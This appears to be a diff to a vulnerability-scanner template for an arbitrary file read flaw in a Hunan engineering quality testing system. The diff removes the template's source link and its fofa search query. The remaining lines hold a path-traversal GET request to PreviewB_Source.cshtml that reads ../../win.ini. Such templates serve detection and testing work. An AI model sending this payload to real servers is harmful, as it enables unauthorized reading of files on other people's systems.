@@ -3,12 +3,8 @@ info:
   name: 湖南建研工程质量检测系统-任意文件读取-PreviewB_Source
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rqxhcyvs8dkaga6c'
+  description: ''
   tags: rce,lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rqxhcyvs8dkaga6c
-    fofa: body="/Content/Theme/Standard/"
 http:
 - raw:
   - 'GET /Applications/Attachment/PreviewB_Source.cshtml?filePath=../../win.ini HTTP/1.1
